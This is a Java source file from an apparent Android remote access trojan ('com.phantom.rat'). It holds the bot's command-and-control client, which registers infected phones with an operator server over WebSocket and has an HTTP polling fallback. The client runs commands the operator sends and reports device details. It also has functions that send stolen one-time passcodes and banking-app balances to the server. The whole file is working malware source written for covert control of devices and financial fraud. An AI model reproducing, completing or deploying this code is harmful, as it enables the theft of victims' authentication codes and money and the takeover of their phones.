package com.phantom.rat;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class WebSocketClient {
    private final Context ctx;
    private final String botId;
    private final String server;
    private final ExecutorService exec = Executors.newSingleThreadExecutor();
    private final CommandExecutor executor;
    private OkHttpClient http;
    private WebSocket ws;
    private volatile boolean alive;
    private volatile boolean running = true;

    public WebSocketClient(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.botId = FudUtils.botId(this.ctx);
        String srv = FudUtils.config(this.ctx, "server", "http://127.0.0.1:32766");
        this.server = srv.endsWith("/") ? srv.substring(0, srv.length() - 1) : srv;
        this.http = new OkHttpClient.Builder().pingInterval(Duration.ofSeconds(20)).build();
        this.executor = new CommandExecutor(this.ctx, this);
    }

    public boolean isAlive() { return alive; }

    public void connect() {
        String wsUrl = server.replace("https://", "wss://").replace("http://", "ws://") + "/ws";
        Request req = new Request.Builder().url(wsUrl).build();
        ws = http.newWebSocket(req, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                alive = true;
                sendHello();
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                try {
                    JSONObject o = new JSONObject(text);
                    if ("cmd".equals(o.optString("type"))) {
                        long cmdId = o.getLong("cmdId");
                        String cmd = o.getString("cmd");
                        String args = o.optString("args", "");
                        executor.execute(cmdId, cmd, args);
                    }
                } catch (Exception ignored) {}
            }

            @Override
            public void onClosing(WebSocket webSocket, int code, String reason) {
                alive = false;
                webSocket.close(code, null);
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                alive = false;
                startHttpFallback();
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                alive = false;
                startHttpFallback();
            }
        });
    }

    private void sendHello() {
        JSONObject o = new JSONObject();
        try {
            o.put("type", "hello");
            o.put("botId", botId);
            o.put("model", FudUtils.model());
            o.put("android", FudUtils.androidVer());
            o.put("country", FudUtils.country(ctx));
            o.put("ip", publicIp());
            o.put("battery", batteryLevel());
            o.put("charging", isCharging());
            o.put("admin", PermissionHelper.isAdmin(ctx));
            o.put("version", "2.0");
            o.put("sim", simOperator());
        } catch (Exception ignored) {}
        sendJson(o);
    }

    public void sendHeartbeat() {
        JSONObject o = new JSONObject();
        try {
            o.put("type", "hb");
            o.put("botId", botId);
            o.put("battery", batteryLevel());
            o.put("charging", isCharging());
        } catch (Exception ignored) {}
        if (!sendJson(o) && running) httpHeartbeat();
    }

    private boolean sendJson(JSONObject o) {
        if (ws != null && alive) {
            ws.send(o.toString());
            return true;
        }
        return false;
    }

    public void sendResult(long cmdId, boolean ok, String data) {
        JSONObject o = new JSONObject();
        try {
            o.put("type", "result");
            o.put("botId", botId);
            o.put("cmdId", cmdId);
            o.put("ok", ok);
            o.put("data", data);
        } catch (Exception ignored) {}
        if (!sendJson(o)) {
            try {
                httpPost("/result", new JSONObject()
                        .put("botId", botId).put("cmdId", cmdId).put("ok", ok).put("data", data));
            } catch (Exception ignored) {}
        }
    }

    public void sendLog(String level, String msg) {
        JSONObject o = new JSONObject();
        try {
            o.put("type", "log");
            o.put("botId", botId);
            o.put("level", level);
            o.put("msg", msg);
        } catch (Exception ignored) {}
        sendJson(o);
    }

    public void sendOtp(String app, String code) {
        JSONObject o = new JSONObject();
        try {
            o.put("type", "otp");
            o.put("botId", botId);
            o.put("app", app);
            o.put("code", code);
        } catch (Exception ignored) {}
        sendJson(o);
    }

    public void sendBalance(String app, String balance) {
        JSONObject o = new JSONObject();
        try {
            o.put("type", "balance");
            o.put("botId", botId);
            o.put("app", app);
            o.put("balance", balance);
        } catch (Exception ignored) {}
        sendJson(o);
    }

    /* ── HTTP fallback C2 ── */
    private void startHttpFallback() {
        if (!running) return;
        exec.execute(() -> {
            while (running && !alive) {
                try {
                    httpHello();
                    JSONArray pending = httpGet("/pending?bot=" + botId);
                    for (int i = 0; i < pending.length(); i++) {
                        JSONObject c = pending.getJSONObject(i);
                        long id = c.getLong("cmdId");
                        try {
                            String r = executor.runCommand(c.getString("cmd"), c.optString("args", ""));
                            httpPost("/result", new JSONObject()
                                    .put("botId", botId).put("cmdId", id).put("ok", true).put("data", r));
                        } catch (Exception e) {
                            httpPost("/result", new JSONObject()
                                    .put("botId", botId).put("cmdId", id).put("ok", false)
                                    .put("data", String.valueOf(e.getMessage())));
                        }
                    }
                    httpHeartbeat();
                } catch (Exception ignored) {}
                try { Thread.sleep(20000); } catch (InterruptedException e) { break; }
            }
        });
    }

    private void httpHello() throws Exception {
        JSONObject o = new JSONObject()
                .put("id", botId)
                .put("model", FudUtils.model())
                .put("android", FudUtils.androidVer())
                .put("country", FudUtils.country(ctx))
                .put("ip", publicIp())
                .put("battery", batteryLevel())
                .put("charging", isCharging())
                .put("admin", PermissionHelper.isAdmin(ctx))
                .put("version", "2.0")
                .put("sim", simOperator());
        httpPost("/hello", o);
    }

    private void httpHeartbeat() {
        try {
            httpPost("/hb", new JSONObject().put("bot", botId));
        } catch (Exception ignored) {}
    }

    private JSONArray httpGet(String path) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(server + path).openConnection();
        c.setConnectTimeout(8000);
        c.setReadTimeout(8000);
        try (BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8))) {
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = r.readLine()) != null) sb.append(l);
            return new JSONArray(sb.toString());
        } finally {
            c.disconnect();
        }
    }

    private void httpPost(String path, JSONObject body) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(server + path).openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setConnectTimeout(8000);
        c.setReadTimeout(8000);
        c.setRequestProperty("Content-Type", "application/json");
        byte[] data = body.toString().getBytes(StandardCharsets.UTF_8);
        try (OutputStream os = c.getOutputStream()) {
            os.write(data);
        }
        c.getInputStream().close();
        c.disconnect();
    }

    public String publicIp() {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL("https://api.ipify.org").openConnection();
            c.setConnectTimeout(4000);
            c.setReadTimeout(4000);
            try (BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()))) {
                return r.readLine();
            } finally {
                c.disconnect();
            }
        } catch (Exception e) {
            return "0.0.0.0";
        }
    }

    private int batteryLevel() {
        try {
            Intent b = ctx.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (b == null) return 0;
            int lvl = b.getIntExtra("level", -1);
            int scale = b.getIntExtra("scale", 100);
            return scale <= 0 ? 0 : (int) Math.round(100.0 * lvl / scale);
        } catch (Exception e) {
            return 0;
        }
    }

    private boolean isCharging() {
        try {
            Intent b = ctx.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (b == null) return false;
            int s = b.getIntExtra("status", -1);
            return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                    || s == android.os.BatteryManager.BATTERY_STATUS_FULL;
        } catch (Exception e) {
            return false;
        }
    }

    private String simOperator() {
        try {
            android.telephony.TelephonyManager tm =
                    (android.telephony.TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm == null) return "";
            String n = tm.getSimOperatorName();
            return n == null ? "" : n;
        } catch (Exception e) {
            return "";
        }
    }

    public void close() {
        running = false;
        if (ws != null) ws.close(1000, null);
    }
}
